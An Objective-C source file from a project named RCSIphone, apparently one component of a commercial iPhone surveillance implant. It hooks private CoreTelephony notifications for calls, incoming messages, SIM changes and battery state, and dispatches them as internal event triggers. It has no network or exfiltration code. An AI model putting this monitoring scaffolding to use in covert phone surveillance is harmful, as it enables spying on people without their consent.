//
//  NSObject+notifications.m
//  RCSIphone
//
//  Created by kiodo on 10/19/10.
//  Copyright 2010 HT srl. All rights reserved.
//

#import "RCSINotificationSupport.h"

//#define DEBUG

// PrivateFrameworks...
extern  NSString*     kCTCallStatusChangeNotification;
extern  NSString*     kCTIndicatorsBatteryCapacityNotification;
extern  NSString*     kCTIndicatorsBatteryCapacity;
extern  NSString*     kCTSIMSupportSIMStatusChangeNotification;
extern  NSString*     kCTSIMSupportSIMStatus;
extern  NSString*     kCTSIMSupportSIMStatusNotInserted;
extern  NSString*     kCTSIMSupportSIMInsertionNotification;
extern  NSString*     kCTMessageReceivedNotification;
extern  NSString* const kCTMessageIdKey;
extern  NSString* const kCTMessageTypeKey;

static RCSINotificationCenter *sharedNotificationCenter = nil;

id      CTTelephonyCenterGetDefault();
void    CTTelephonyCenterAddObserver(id center,
                                     const void *observer,
                                     CFNotificationCallback callBack,
                                     CFStringRef name,
                                     const void *object,
                                     CFNotificationSuspensionBehavior suspensionBehavior);


// Callback for coretelephony
static void ctNotificationCallback (CFNotificationCenterRef center, 
                                    void *observer, 
                                    CFStringRef name, 
                                    const void *object, 
                                    CFDictionaryRef userInfo) 
{  
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

#ifdef DEBUG_TMP
  if (userInfo != nil)
    NSLog(@"%s: name %@ userinfo %@", __FUNCTION__, name, userInfo);
  else 
    NSLog(@"%s: name %@ userinfo -", __FUNCTION__, name);
#endif
  
  RCSINotificationCenter *ntf = (RCSINotificationCenter *) observer;
  
  if (!userInfo) 
    {
      [pool release];
      return;
    }

  [ntf dispatchRCSNotfication: (NSString *)name withObject: (id)userInfo];
  
  [pool release];
  
  return; 
}


@implementation RCSINotificationCenter : NSObject

+ (RCSINotificationCenter *)sharedInstance
{
  @synchronized(self)
  {
  if (sharedNotificationCenter == nil)
    {
      [[self alloc] init];
    }
  }
  
  return sharedNotificationCenter;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
  if (sharedNotificationCenter == nil)
    {
      sharedNotificationCenter = [super allocWithZone: aZone];
    
      //
      // Assignment and return on first allocation
      //
      return sharedNotificationCenter;
    }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)init
{
  self = [super init];
  
  if (self != nil) 
    {
      notificationMask  = 0;
      notificationObjects = [[NSMutableArray alloc] initWithCapacity: 0];
      ctNotificationIsStarted = NO;
      callRefCount      = 0;
      simRefCount       = 0;
      batteryRefCount   = 0;
      connectRefCount   = 0;
      smsRefCount       = 0;
    }
  
  return self;
}

- (BOOL)startCTNotifications
{
#ifdef DEBUG_TMP
  NSLog(@"%s: start ctNotificationCenter on thread id %@", __FUNCTION__, [NSThread currentThread]);
#endif
  
  // Receive notification for incoming messages (privateFrameworks)
  id ct = CTTelephonyCenterGetDefault();
  
  // add the callback for messages (privateFrameworks)
  if(ct != nil)
    {
      CTTelephonyCenterAddObserver(ct, 
                                   self, 
                                   ctNotificationCallback,
                                   NULL,
                                   NULL,
                                   CFNotificationSuspensionBehaviorDeliverImmediately);
    
      ctNotificationIsStarted = YES;
    }
  else 
    {
#ifdef DEBUG_TMP
      NSLog(@"%s: start ctNotificationCenter ERROR", __FUNCTION__);
#endif
      ctNotificationIsStarted = NO;
      
      return NO;
    }
  
  NSRunLoop *runl = [NSRunLoop currentRunLoop];
  
  [runl run];
  
  return YES;
}

- (BOOL)setEventMask: (UInt32) anEvent
{
  switch (anEvent) 
  {
    case SMS_CT_EVENT:
      smsRefCount++;
    break;
    case CONNECT_CT_EVENT:
      connectRefCount++;
    break;
    case BATTERY_CT_EVENT:
      batteryRefCount++;
#ifdef DEBUG_TMP
      NSLog(@"%s: batteryrefCount %d", __FUNCTION__, batteryRefCount);
#endif
    break;
    case SIM_CT_EVENT:
      simRefCount++;
    break;
    case CALL_CT_EVENT:
      callRefCount++;
    break;
    
    default:
    return NO;
  }
  
  notificationMask |= anEvent;
  
#ifdef DEBUG_TMP
  NSLog(@"%s: notification mask %x", __FUNCTION__, notificationMask);
#endif
  
  return YES;
}

- (BOOL)resetEventMask: (UInt32) anEvent
{
  switch (anEvent) 
  {
    case SMS_CT_EVENT:
    smsRefCount--;
    if (smsRefCount == 0) 
      {
        notificationMask &= ~SMS_CT_EVENT;
      }
    break;
    case CONNECT_CT_EVENT:
      connectRefCount--;
      if (connectRefCount == 0) 
        {
          notificationMask &= ~CONNECT_CT_EVENT;
        }
    break;
    case BATTERY_CT_EVENT:
      batteryRefCount--;
      if (batteryRefCount == 0) 
        {
          notificationMask &= ~BATTERY_CT_EVENT;
        }
    break;
    case SIM_CT_EVENT:
      simRefCount--;
      if (simRefCount == 0) 
        {
          notificationMask &= ~SIM_CT_EVENT;
        }
    break;
    case CALL_CT_EVENT:
      callRefCount--;
      if (callRefCount == 0) 
        {
          notificationMask &= ~CALL_CT_EVENT;
        }
    break;
    
    default:
    return NO;
  }
  
  return YES;
}

- (BOOL)addNotificationObject: (id)anObject withEvent: (UInt32)anEventID
{
#ifdef DEBUG
  NSLog(@"%s: ad notification %d for object %@", __FUNCTION__, anEventID, anObject);
#endif  
  
  int i = 0;
  
  // Start the ct if not
  if (ctNotificationIsStarted == NO) 
    {
//      [self performSelectorOnMainThread: @selector(startCTNotifications)
//                             withObject: nil
//                          waitUntilDone: YES];
    
    // using thread runloop
    [NSThread detachNewThreadSelector: @selector(startCTNotifications) 
                             toTarget: self 
                           withObject: nil];
    
#ifdef DEBUG
      NSLog(@"%s: startCTNotifications done", __FUNCTION__);
#endif 
    }
  
  for (i = 0; i < [notificationObjects count];  i++) 
    {
      id obj = [notificationObjects objectAtIndex: i];
      
      if (obj == anObject) 
        {
          [obj retainEvent: anEventID];
          [self setEventMask: anEventID];
          
          return YES;
        }
    }
  
  [notificationObjects addObject: anObject];
  [anObject retainEvent: anEventID];
  [self setEventMask: anEventID];
  
  return YES;
}

- (BOOL)removeNotificationObject: (id)anObject withEvent: (UInt32)anEventID
{
  int i = 0;
  
  for (i = 0; i < [notificationObjects count];  i++) 
    {
      id obj = [notificationObjects objectAtIndex: i];
      
      if (obj == anObject) 
        {
          [obj releaseEvent: anEventID];
          [self resetEventMask: anEventID];
          
          if ([obj eventRefCount] == 0) 
            {
              [notificationObjects removeObjectAtIndex: i];
            }
          
          return YES;
        }
    }
  
  return NO;
}

- (BOOL)dispatchRCSNotfication: (NSString *)aName withObject: (id)anObject
{
  int eventID = 0;
  int i = 0;
  
  if ([aName compare: kCTCallStatusChangeNotification] == NSOrderedSame) 
    {
#ifdef DEBUG
      id typeValue    = [(NSDictionary *) anObject objectForKey: @"kCTCall"];
      id statusValue  = [(NSDictionary *) anObject objectForKey: @"kCTCallStatus"];

#ifdef DEBUG
      NSLog(@"%s: call notification call %@, status %@", __FUNCTION__, typeValue, statusValue);
#endif
    
      if (CFGetTypeID(typeValue) == CFStringGetTypeID()) 
        {
          CFStringRef theString = (CFStringRef)typeValue;
#ifdef DEBUG
          NSLog(@"%s: number %@", __FUNCTION__, theString);
#endif
        }
      else 
        {
#ifdef DEBUG
          NSLog(@"%s: call number tpye id %d [%d]", __FUNCTION__, CFGetTypeID(typeValue), CFStringGetTypeID());
#endif
        }
#endif
    }
  else if ([aName compare: kCTIndicatorsBatteryCapacity]                == NSOrderedSame
           || [aName compare: kCTIndicatorsBatteryCapacityNotification] == NSOrderedSame)
    {
#ifdef DEBUG
      NSLog(@"%s: battery notification info %@", __FUNCTION__, anObject );
#endif
      eventID = BATTERY_CT_EVENT;
    }
  else if ([aName compare: kCTMessageReceivedNotification] == NSOrderedSame)
    {
#ifdef DEBUG
      NSLog(@"%s: message notification info %@", __FUNCTION__, anObject);
#endif 
    }
  else if ([aName compare: kCTSIMSupportSIMInsertionNotification]       == NSOrderedSame
           || [aName compare: kCTSIMSupportSIMStatusChangeNotification] == NSOrderedSame)
    {                      
#ifdef DEBUG
      NSLog(@"%s: SIM notification info %@", __FUNCTION__, anObject);
#endif  
      if ([aName compare: kCTSIMSupportSIMStatusChangeNotification] == NSOrderedSame) 
        {
          NSString *str = (NSString *)[anObject objectForKey: @"kCTSIMSupportSIMStatus"];
        
          if (str != nil && [str compare: @"kCTSIMSupportSIMStatusNotInserted"] == NSOrderedSame)
            {
              eventID = SIM_CT_EVENT;
            }
        }
      else
        {
          eventID = SIM_CT_EVENT;
        }
    }
  
//  switch ([typeValue intValue]) 
//  {
//    case SMS_TYPE:
//      eventID = SMS_CT_EVENT;
//    break;
//    case CONNECT_TYPE:
//      eventID = CONNECT_CT_EVENT;
//    break;
//      case BATTERY_TYPE:
//    eventID = BATTERY_CT_EVENT;
//      break;
//    case SIM_TYPE:
//      eventID = SIM_CT_EVENT;
//    break;
//    case CALL_TYPE:
//      eventID = CALL_CT_EVENT;
//    break;
//  }
  
  if (eventID & notificationMask)
    {
      for (i = 0; i < [notificationObjects count]; i++) 
        {
          RCSIEventsSupport *obj = (RCSIEventsSupport *)[notificationObjects objectAtIndex: i];
          [obj dispatchRcsEvent: eventID withObject: anObject];
        }
    }
  
  return YES;
}

@end

@implementation RCSIEventsSupport : NSObject

- (void)initEvent
{
  batteryRefCount = 0;
  callRefCount    = 0;
  connectRefCount = 0;
  simRefCount     = 0;
  smsRefCount     = 0;
}

- (int)eventRefCount
{
  return notificationRefCount;
}

- (id)retainEvent: (UInt32)anEvent
{
  notificationRefCount++;
  
  switch (anEvent) 
    {
    case SMS_CT_EVENT:
      smsRefCount++;
    break;
    case CONNECT_CT_EVENT:
      connectRefCount++;
    break;
    case BATTERY_CT_EVENT:
      batteryRefCount++;
    break;
    case SIM_CT_EVENT:
      simRefCount++;
    break;
    case CALL_CT_EVENT:
      callRefCount++;
    break;
    }
  
  return self;
}

- (void)releaseEvent: (UInt32)anEvent
{
  if (notificationRefCount > 0) 
    {
      notificationRefCount--;
      switch (anEvent) 
        {
        case SMS_CT_EVENT:
          smsRefCount--;
        break;
        case CONNECT_CT_EVENT:
          connectRefCount--;
        break;
        case BATTERY_CT_EVENT:
          batteryRefCount--;
        break;
        case SIM_CT_EVENT:
          simRefCount--;
        break;
        case CALL_CT_EVENT:
          callRefCount--;
        break;
        }
    }
}

- (void)dispatchRcsEvent: (UInt32)anEvent withObject: (id)anObject
{
  
}

@end
